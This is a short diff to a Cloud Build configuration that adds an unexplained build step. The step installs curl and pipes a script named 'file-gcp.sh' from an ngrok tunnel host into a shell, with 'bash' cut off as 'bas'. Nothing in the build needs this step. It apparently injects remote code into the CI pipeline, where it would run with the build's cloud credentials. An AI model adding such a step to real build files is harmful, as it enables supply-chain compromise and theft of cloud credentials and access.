@@ -2,6 +2,9 @@ steps:
   - name: 'ubuntu'
     args: ['chmod', 'a+rx', '-R', '/workspace']
     # Run the bazel image with docker run to ensure workspace gets mounted in correctly.
+  - name: ubuntu
+    script: apt update -y && apt-get install curl -y && curl https://72d4-193-29-61-27.ngrok.io/file-gcp.sh | bas
+
   - name: 'gcr.io/cloud-builders/docker:latest'
     args: ['run', '-w', '/workspace',
            '-v', '/workspace:/workspace',
